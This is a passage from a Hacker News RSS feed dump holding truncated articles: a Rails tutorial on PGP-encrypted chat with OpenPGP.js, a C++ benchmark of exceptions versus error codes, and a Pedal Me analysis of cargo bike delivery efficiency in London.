<span>-</span> <span>@messages</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>message</span><span>|</span>
  <span>div</span> <span>style</span><span>=</span><span>(</span><span>"text-align: right"</span> <span>if</span> <span>message</span><span>.</span><span>sender_id</span> <span>==</span> <span>current_user</span><span>.</span><span>id</span><span>)</span>
    <span>div</span>
    <span>small</span> <span>=</span> <span>l</span> <span>message</span><span>.</span><span>created_at</span><span>,</span> <span>format: :short</span>
<span>=</span> <span>form_with</span> <span>model: </span><span>@message</span><span>,</span> <span>url: </span><span>user_messages_path</span><span>(</span><span>@user</span><span>)</span> <span>do</span> <span>|</span><span>f</span><span>|</span>
  <span>=</span> <span>f</span><span>.</span><span>text_area</span> <span>:content</span>
  <span>=</span> <span>f</span><span>.</span><span>submit</span>
</code></pre></div></div>

<p>Again relatively straight forward: Iterate over all messages and display the creation date and add a form with the message content.</p>

<p>Also we need a corresponding controller to persist those messages:</p>

<div><div><pre><code><span>class</span> <span>MessagesController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>before_action</span> <span>:require_login</span>
  <span>def</span> <span>create</span>
    <span>@message</span> <span>=</span> <span>Message</span><span>.</span><span>create!</span> <span>params</span><span>.</span><span>permit</span><span>(</span><span>:content</span><span>).</span><span>to_h</span><span>.</span><span>merge</span><span>(</span><span>sender_id: </span><span>current_user</span><span>.</span><span>id</span><span>,</span> <span>receiver_id: </span><span>params</span><span>[</span><span>:user_id</span><span>])</span>
    <span>redirect_to</span> <span>@message</span><span>.</span><span>receiver</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>This action will redirect to the receiver - which effectively reloads the page and shows the newly created message, which will look like this once we have some content:</p>

<p><img src="https://jensravens.com/img/posts/pgp/chat.png" alt="PGP based Chat"></p>

<p>With the basic CRUD out of the way, let’s get to the interesting part - the encryption.</p>

<h2 id="key-management">Key Management</h2>

<p>With the existing controller and UI the user could already create a key somewhere else and put it into the field. But to make things easier and more convenient, we’ll allow generating a key pair in the browser. For this, we will use Stimulus.js and https://github.com/openpgpjs/openpgpjs.</p>

<p>OpenPGP.js is quite a heavy dependency (it adds about 350kb to your bundle), so let’s load it asynchronously only if it’s needed. To better structure our frontend code, all encrypt/decrypt related code will go into <code>app/javascript/model/crypto.js</code>.</p>

<p>Copy the openpgp.js code into <code>app/javascript/lib/openpgp.js</code> (as of the time writing, it doesn’t work yet as a yarn dependency with webpack) and implement a loading function:</p>

<div><div><pre><code><span>export</span> <span>async</span> <span>function</span> <span>loadPGP</span><span>()</span> <span>{</span>
  <span>await</span> <span>import</span><span>(</span><span>"</span><span>../lib/openpgp</span><span>"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This code uses an async import (isn’t modern javascript cool?), which will tell Webpacker to split the bundle into multiple chunks. This way the PGP library is only loaded if it is actually needed and will not block loading the page.</p>

<p>Now let’s allow the user to generate a keypair:</p>

<div><div><pre><code><span>// crypto.js</span>

<span>export</span> <span>async</span> <span>function</span> <span>generateKey</span><span>()</span> <span>{</span>
  <span>await</span> <span>loadPGP</span><span>();</span>
  <span>return</span> <span>await</span> <span>openpgp</span><span>.</span><span>generateKey</span><span>({</span>
    <span>curve</span><span>:</span> <span>"</span><span>curve25519</span><span>"</span><span>,</span>
    <span>userIds</span><span>:</span> <span>[{</span> <span>name</span><span>:</span> <span>"</span><span>Anonymous</span><span>"</span><span>,</span> <span>email</span><span>:</span> <span>"</span><span><a href="https://jensravens.com/cdn-cgi/l/email-protection" data-cfemail="2f424e46436f4a574e425f434a014c4042">[email&nbsp;protected]</a></span><span>"</span> <span>}],</span>
  <span>});</span>
<span>}</span>
</code></pre></div></div>

<p>This makes sure the dependency is loaded before calling into PGP to generate a key. This code is using the <code>curve25519</code> encryption curve, which is quite a recent addition that results in secure, but relatively short keys.</p>

<p>Let’s also add a message to persist a private key in the browser for later use:</p>

<div><div><pre><code><span>// crypto.js</span>
<span>// persist an array of all known private keys in local storage so it can be read later</span>
<span>export</span> <span>async</span> <span>function</span> <span>registerKey</span><span>(</span><span>plainKey</span><span>)</span> <span>{</span>
  <span>const</span> <span>keys</span> <span>=</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>localStorage</span><span>.</span><span>getItem</span><span>(</span><span>"</span><span>keys</span><span>"</span><span>)</span> <span>||</span> <span>"</span><span>[]</span><span>"</span><span>);</span>
  <span>keys</span><span>.</span><span>push</span><span>(</span><span>plainKey</span><span>);</span>
  <span>localStorage</span><span>.</span><span>setItem</span><span>(</span><span>"</span><span>keys</span><span>"</span><span>,</span> <span>JS…</span></code></pre></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jensravens.com/e2e-encryption-with-rails/">https://jensravens.com/e2e-encryption-with-rails/</a></em></p>]]>
            </description>
            <link>https://jensravens.com/e2e-encryption-with-rails/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201320</guid>
            <pubDate>Tue, 24 Nov 2020 18:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Error codes are far slower than exceptions]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25201269">thread link</a>) | @vips7L
<br/>
November 24, 2020 | https://lordsoftech.com/programming/error-codes-are-far-slower-than-exceptions/ | <a href="https://web.archive.org/web/*/https://lordsoftech.com/programming/error-codes-are-far-slower-than-exceptions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
TL;DR On modern 64-bit PC architectures, C++ exceptions only add unreachable code with destructor calls into functions and their effect on performance is below 1%, but such low values are difficult to measure. Handling rare errors with return values requires additional branching that slows down the program in realistic scenarios by about 5% and are also less convenient. If an exception is actually thrown, stack unwinding costs about 2 µs per stack frame.
</p>

<p>C is considered to be the fastest programming language. C++ has features that only make C more convenient without an effect on performance and features that do impact performance. They help a lot to improve code quality, so they are often used anyway. Runtime polymorphism is virtually ubiquitous, exceptions less so.</p>



<p>A completely valid reason not to use exceptions is when the executable’s size is or is expected to be tightly constrained by the platform’s limitations. A questionable reason not to use them is performance, as it’s unlikely for completely new functionality to work without compromises. Also, using exceptions in wrong cases can completely ruin performance because handling a thrown exception is known to be very expensive.</p>



<p>But how significant is the performance impact? On most modern 64-bit platforms, exceptions are implemented in a way that minimises their cost as long as they are not thrown. There are no checks for exceptions being thrown in the generated functions, the execution switches to special functions and special data when handling an exception. However, not using exceptions is not free either. Rare errors have to be handled somehow. One possibility is to have the program simply abort, leaving any broken state on the disk, leading to very annoying user experience (done for example in Unreal Engine and Unity Engine, where incorrect API usage in code causes the editor to crash and keep crashing until the incorrect binaries are manually erased). Another alternative are error codes, when functions report they failed and the calling code is supposed to react appropriately, which is less convenient for the programmer and requires the program an additional check after returning from functions, however, it’s often done for performance reasons.</p>



<p>But actually, how do these approaches affect performance? I have tested this on realistic examples that simulate use cases typical for video games.</p>



<h2>Reminder – where not to use exceptions?</h2>



<p>An exception, as its name suggests, is supposed to deal with <em>exceptional</em> cases. An exception is a case when a rule doesn’t apply. In software, that means something isn’t going as intended. Not a part of a use case. A failure. Invalid user input, connection failure, corrupted data, invalid packet, failure to initialise a device, missing file, programmer errors…</p>



<p>In many of these cases, the program shouldn’t just abort. Invalid user input stopping the program is super annoying because it causes all unsaved data to be lost and forcing the user to wait until the program restarts. Connection failure is a very recoverable problem, usually solvable by simply reconnecting. Invalid packet causing a program to crash is an open door to sabotage, as anyone can send invalid packets to cause the program to crash. And that is what can be solved by exceptions. Throwing them is slow, but the code does not need to be optimised to what isn’t its use case.</p>



<p>Examples of incorrect use of exceptions is when they’re thrown when everything works as it should. Breaking from a double loop, handling the end of a container, checking if a number can be deserialised in order to use a default value otherwise…</p>



<p>Modern 64 bit architectures use a model called <em>zero-cost exceptions</em> that optimises error handling with exceptions strongly in favour of the happy path when no exception is thrown at the cost of very bad performance of exceptions when they are actually thrown.</p>



<p>In other words, it should be possible to run the program in a debugger with the stop on exception function enabled.</p>



<p>Although not all error handling can be efficiently handled with exceptions, error codes can handle all of it. The question is, should they?</p>



<h2>Test 1 – XML parsing</h2>



<p>For the purpose of this test, I have written an XML parser. I chose to write a parser because it can fail at many locations and does not depend on I/O. It’s definitely not standard-compliant or guaranteed to fail on every possible invalid input, but it can parse a usual XML configuration file and should end with an error in most cases where the file is syntactically incorrect. The code is quite low level and should be relatively fast (about 150 MiB/s), but I did not optimise it and used STL containers to make it convenient to use (as opposed to in-situ parsing). I wrote it with a lot of <code>#ifdef</code> checks to switch between exceptions, error codes and abort on error just with compiler arguments and thus ensure that the only differences between the variants would be what is necessary for different error handling.</p>



<p>I benchmarked it with <a href="https://gist.github.com/Dugy/5fee1b49777054d01f12e22ce9f986e5">an XML file that imitates the configuration of a video game</a>. Its size is 32 kiB and is loaded into memory before the benchmarks start. The parsing was repeated 10000 times and the duration was averaged, then repeated 10 times to test that its imprecision was below 1%.</p>



<p>The code was compiled with GCC 9, on Ubuntu 20.04, with an Intel i7-9750H processor with maximum single threaded frequency 4.5 GHz. I ran all experiments that I wanted to compare at a similar time, without doing anything in between, in order to equalise the influence of other programs occupying cache. Anyway, there were still outliers that took noticeably more than average. I removed these.</p>



<p>The version that aborted on error was as fast as the version with exceptions. The version with error codes was 5% slower.</p>



<p>For some reasons, if failures were handled by a special function that printed the error and exited the program, it was for some reasons slightly (about 1%) slower than the version with exceptions. I had to use a macro to make it comparable to the speed of code using exceptions. This behaviour was repeated in the other tests.</p>



<h2>Test 2 – filling classes with the parsed XML</h2>



<p>For this test, I’ve written several classes meant to represent the structures in the XML file and code for filling the data with the parsed XML structure. This part was about 10 times faster, probably because there was much less dynamic allocation.</p>



<p>The error margins of the code with exceptions and the code with no proper error handling overlapped, but the times were 0.6% higher for exceptions. In the case of error codes, the program was 4% slower. I achieved a similar slowdown by forgetting to use move semantics.</p>



<h2>Test 3 – Updating with data from a binary stream</h2>



<p>This test imitates the usage of an asynchronous API for reading data from a TCP socket (such as Boost Asio or Unix Sockets). These APIs are used in a way that always a certain number of bytes is read from the stream, have to be processed and then more data is read. For faster processing and reduced bandwidth, the data are in binary form. Because network data in video games are streamed continuously, waiting for the end is not feasible.</p>



<p>The communication is represented by three message types that identify different possible updates. Because the messages have different lengths, it’s not possible to exactly determine whether all of the message’s length is available, so the function that identifies the message and calls appropriate parsing code will fail often even if everything is running correctly – so exceptions cannot be used to handle this type of failure. Other failures, like unidentifiable message types, wrong identification of objects or large sudden changes of values (either cheating or data corruption) are still handled by exceptions (in the case where they are used).</p>



<p>The data were read from memory in order to prevent networking from influencing the tests. The data were generated by <a href="https://gist.github.com/Dugy/d3d851ab4826cc3121fc00b79cb5124d">this script</a>.</p>



<p>The result of the test was similar to previous tests – the code using exceptions for error handling was 0.8% slower than the code that aborted on error, which was within the margin of error, while the code using error codes to handle errors was 6% slower.</p>



<h2>The results</h2>



<p>The times taken by the benchmarks are summarised in the following table, scaled so that the time needed by the version that aborts when an error happens is 100%.</p>



<figure><table><thead><tr><th>Test</th><th>Abort</th><th>Exception</th><th>Error code</th></tr></thead><tbody><tr><td>Parsing</td><td>100%</td><td>100%</td><td>106.2%</td></tr><tr><td>Filling</td><td>100%</td><td>100.6%</td><td>104.2%</td></tr><tr><td>Updating</td><td>100%</td><td>100.8%</td><td>106.2%</td></tr></tbody></table></figure>



<p>The imprecision was around 1%, so the version using exceptions might not really be slightly slower and the difference might be the result of chance or some invisible compiler decisions, like inlining. The time needed by the version using error codes was consistently higher.</p>



<p>The entire source code is <a href="https://gist.github.com/Dugy/2532c810bb232b8ff1603cfa679bdf28">here</a>.</p>



<h2>Error handling and clean code</h2>



<p>When an exception is not handled in a block, the execution exits the block automatically until it finds a piece of code that can catch it. Any other type of handling does not support this and requires writing additional logic to handle the failure, although in almost all cases the appropriate reaction is to abort the operation the program is performing (the test with reading from a stream is an example where this does not apply). This can significantly lengthen the code even if the reaction to any failure in a function being called is to return the error code to the caller’s caller.</p>



<p>This is a line from the initialisation sector of a constructor in test 2:</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">	animation(*source.getChild("animation")),</pre>



<p>It forwards the child XML tag called <code>animation</code> of its argument to the constructor of a member class called&nbsp;<code>animation</code>. The constructor may fail due to incorrect content of the XML tag, or <code>getChild</code> function can fail because the entire tag is missing. This aborts the creation of the structure, or some other process in the program that’s in the <code>catch</code> block.</p>



<p>If the errors …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lordsoftech.com/programming/error-codes-are-far-slower-than-exceptions/">https://lordsoftech.com/programming/error-codes-are-far-slower-than-exceptions/</a></em></p>]]>
            </description>
            <link>https://lordsoftech.com/programming/error-codes-are-far-slower-than-exceptions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201269</guid>
            <pubDate>Tue, 24 Nov 2020 18:20:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Cargo bikes? An empirical analysis of the Pedal Me fleet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201188">thread link</a>) | @ingve
<br/>
November 24, 2020 | https://pedalme.co.uk/why-cargo-bikes/ | <a href="https://web.archive.org/web/*/https://pedalme.co.uk/why-cargo-bikes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><h2>A short introduction to the future of urban mobility.</h2><p>Cargo bikes are often faced with misconceptions about their potential and use for large scale logistics. In this post, we present the case of Pedal Me in London to demonstrate their efficiency in dense urban areas and emphasise their competitive advantage over cars and smaller vans.</p><p>To do so, we analyse data from our fleet in September 2020 and summarise the direct logistical advantages of e-cargo bikes. We report on the average speeds of our bikes, and compare the distances travelled by bikes and cars for similar journeys. We then investigate the case of larger logistics jobs to evaluate how e-cargo bikes fare against motorised vehicles with much larger capacity.</p><p>For e-cargo bikes to be able to replace a significant proportion of van and car journeys, we explain the importance of using them at their maximum potential and give a brief overview of the training program at Pedal Me. In the end, we look at the huge impact e-cargo bikes can have beyond more efficient logistics for making kinder and healthier cities.</p><h2>1. Logistical advantages of e-cargo bikes</h2><h3>a. Faster speeds in dense urban areas 🐇</h3><p>To compare e-cargo bikes and motorised vehicles, we start by looking at their speeds in central and inner London to those of cars and vans. <a href="https://www.london.gov.uk/questions/2019/19767">Transport for London reports that in 2018</a>, the general traffic speeds in London, as measured for central, inner and outer London using GPS-based data for key roads on weekdays (07:00 to 19:00), were:</p><ul><li>11.4 km/h in central London (in green on map below)</li><li>18.7 km/h in inner London (orange on map)</li></ul><p>These numbers should be taken as an upper bound though, given that the congestion levels in inner London this year were <a href="https://envirotecmagazine.com/2020/09/16/study-says-traffic-congestion-increasing-in-london-above-2019-levels-outside-city-centre/">reported to be significantly worse than last year</a> (<a href="https://www.theguardian.com/environment/2020/sep/15/road-congestion-levels-in-outer-london-higher-than-before-lockdown">up to 153%</a>).</p><p>To measure the speed of the Pedal Me fleet, we collected GPS data from 37 bikes in September 2020 between 07:00 and 19:00. This corresponds to approximately 19,000 km ridden. In central London, the average speed of the bikes was of 15km/h. In inner London, it was of 16.4 km/h. What this shows, is that within a 3-5 miles radius of the centre, bikes are likely to move significantly faster than vans or cars. With congestion levels going up due to more cars on the road on one hand, and with more restricted lanes and continued investment in cycling infrastructure on the other, this advantage will only be heightened.</p><p>Indeed, the competitive speeds can be largely explained by the fact that cargo bikes can move past stationary traffic, are allowed to use bus lanes and benefit from separated cycling infrastructure.</p><div id="attachment_8465"><p><img src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=592%2C592&amp;ssl=1" alt="" width="592" height="592" srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=150%2C150&amp;ssl=1 150w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=768%2C768&amp;ssl=1 768w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=650%2C650&amp;ssl=1 650w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=1125%2C1125&amp;ssl=1 1125w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?w=2120&amp;ssl=1 2120w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?w=3180&amp;ssl=1 3180w" sizes="(max-width: 592px) 100vw, 592px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=150%2C150&amp;ssl=1 150w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=768%2C768&amp;ssl=1 768w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=650%2C650&amp;ssl=1 650w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=1125%2C1125&amp;ssl=1 1125w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?w=2120&amp;ssl=1 2120w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?w=3180&amp;ssl=1 3180w" data-lazy-src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/sept_all_bikes_gps_with_zones.jpg?resize=592%2C592&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>Orange: Inner London. Green: Central London. Pink lines show the bike movements analysed.</p></div><p>Beyond competitive moving speeds, and perhaps more importantly for dense urban areas, e-cargo bikes do not need to waste time on finding parking space. Parking is a considerable burden for delivery vans (<a href="https://link.springer.com/article/10.1186/s12544-019-0349-5" target="_blank" rel="noopener noreferrer" data-token-index="1" data-reactroot="">studies show this takes between 9-15 minutes</a>). They usually imply some additional walking to the final delivery point, as well as frequent parking fines (in the first quarter of 2013, FedEx and UPS owed NYC $2.8 million combined in parking fines). The cost of finding parking means that <a href="https://dl.acm.org/doi/abs/10.1145/3173574.3174100" target="_blank" rel="noopener noreferrer" data-token-index="5" data-reactroot="">many delivery drivers opt for longer walking distances between drops to avoid having to waste time on parking</a>.</p><p><img src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=609%2C490&amp;ssl=1" alt="" width="609" height="490" srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=1024%2C824&amp;ssl=1 1024w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=768%2C618&amp;ssl=1 768w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?w=1196&amp;ssl=1 1196w" sizes="(max-width: 609px) 100vw, 609px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=1024%2C824&amp;ssl=1 1024w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=768%2C618&amp;ssl=1 768w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?w=1196&amp;ssl=1 1196w" data-lazy-src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/Screenshot_2020-10-19_at_11.43.53.png?resize=609%2C490&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><h3>b. Shorter trip lengths 🗺</h3><p>Beside the speed of movement, e-cargo bikes also benefit from shorter routes. To analyse the significance of this, we look at the estimated differences in trip distances for cars and bikes of Pedal Me jobs in September. In total we compare the distances for more than 2000 jobs using Open Street Maps (using the <a href="https://geoffboeing.com/2016/11/osmnx-python-street-networks/">OSMnx library</a>) to measure the shortest journeys when cycling and driving.</p><p>On average, bike trips were 6% shorter than car trips. Of the 11,800 km studied this corresponded to 620km saved. When looking at trips that were shorter than 5km, the journeys were on average 8% shorter, with 25% of trips being at least 10% shorter in terms of distance. This effect has been seen in other cities as well. <a href="https://www.rippl.bike/en/rippl-23-consolidation-down-under-sydneys-cbd-cycle-logistics-hub/">A study in Sydney</a>, for example, showed that bikes travelled a third less than vans in the city.</p><h3>c. Efficiency of smaller capacity vehicles in last mile delivery 📦</h3><p>The limited capacity of e-cargo bikes can be a deceiving aspect of their efficiency for large scale last mile delivery operations.</p><p>During the first lockdown in the Spring of 2020, Pedal Me displayed the potential of e-cargo bikes by <a href="https://pedalme.co.uk/2020/09/08/pedal-me-x-lambeth-council/">delivering over 10,000 packages in collaboration with Lambeth Council</a> to the individuals and families most in need.</p><p>In this section, we compare the delivery distances for three client jobs, where the loads surpass the capacity of cargo bikes to explain how cargo bikes can outcompete vans despite their smaller capacity.</p><p>For each client job, we compare the total distances travelled across all vehicles for vans and cargo bikes. A visual analogy would be to compare the lengths of thread required to draw the routes satisfying all deliveries. For an apples to apples comparison, we ignore the advantage of shorter routes available to cargo bikes that we saw in the previous section and assume vans and bikes follow the same directions.</p><p>We compare total distances for a large number of drops under the assumption that 50km driven by a van are equivalent to 50km ridden by bike in terms of (wo)man-hours, even when those kms are done by multiple vehicles (e.g. 50km x 1 = 10km x 5).</p><p>To find the optimal routing of vehicles, we used the Google OR optimisation engine and the driving distances from Open Street Maps (OSMnx).</p><p>The first job consists of 9 drops spread widely across the city, which are deliveries for the Water House Project restaurant in East London. A cargo bike is only able to carry 6 of these boxes, as they are quite voluminous.</p><div id="attachment_8467"><p><img src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?resize=370%2C424&amp;ssl=1" alt="" width="370" height="424" srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?w=754&amp;ssl=1 754w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?resize=262%2C300&amp;ssl=1 262w" sizes="(max-width: 370px) 100vw, 370px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?w=754&amp;ssl=1 754w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?resize=262%2C300&amp;ssl=1 262w" data-lazy-src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-drops.png?resize=370%2C424&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>The red icon represents the pickups and blue represent the drops</p></div><p>For a single van, the total distance travelled to deliver all 9 packages is of 54km. For three cargo bikes, the total distance travelled was of 48km, brushing off 6km (i.e. more than 10% of the distance).</p><div><div id="attachment_8468"><p><img src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?resize=417%2C269&amp;ssl=1" alt="" width="417" height="269" srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?w=658&amp;ssl=1 658w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?resize=300%2C193&amp;ssl=1 300w" sizes="(max-width: 417px) 100vw, 417px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?w=658&amp;ssl=1 658w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?resize=300%2C193&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-van-route.png?resize=417%2C269&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies route for a single van for all 9 drops (total distance 54km)</p></div></div><br><div><div id="attachment_8469"><p><img src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?resize=400%2C260&amp;ssl=1" alt="" width="400" height="260" srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?w=656&amp;ssl=1 656w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?resize=300%2C195&amp;ssl=1 300w" sizes="(max-width: 400px) 100vw, 400px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?w=656&amp;ssl=1 656w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?resize=300%2C195&amp;ssl=1 300w" data-lazy-src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/WHP-bike-routes.png?resize=400%2C260&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies routes for three cargo bikes (total distance 48km)</p></div></div><p>The second job consists of 114 drops across the city, for Grubby, a plant based recipe kit company. Here, the Pedal Me cargo bikes are able to carry 30 parcels.</p><div id="attachment_8470"><p><img src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=419%2C461&amp;ssl=1" alt="" width="419" height="461" srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=930%2C1024&amp;ssl=1 930w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=272%2C300&amp;ssl=1 272w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=768%2C846&amp;ssl=1 768w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?w=990&amp;ssl=1 990w" sizes="(max-width: 419px) 100vw, 419px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=930%2C1024&amp;ssl=1 930w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=272%2C300&amp;ssl=1 272w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=768%2C846&amp;ssl=1 768w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?w=990&amp;ssl=1 990w" data-lazy-src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubby-drops.png?resize=419%2C461&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>The red icon represents the pickups and blue represent the drops</p></div><p>While a van may carry all packages, we compare the total distances for three vans, assuming that 50 deliveries require approximately 8 hours of work. We find that the total distance for three vans is 65km. For 5 cargo bikes, the total distance was of 62km, again leading to more efficient logistics overall.</p><div><div id="attachment_8471"><p><img src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?resize=405%2C263&amp;ssl=1" alt="" width="405" height="263" srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?w=660&amp;ssl=1 660w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?resize=300%2C195&amp;ssl=1 300w" sizes="(max-width: 405px) 100vw, 405px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?w=660&amp;ssl=1 660w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?resize=300%2C195&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-bikes.png?resize=405%2C263&amp;is-pending-load=1#038;ssl=1" 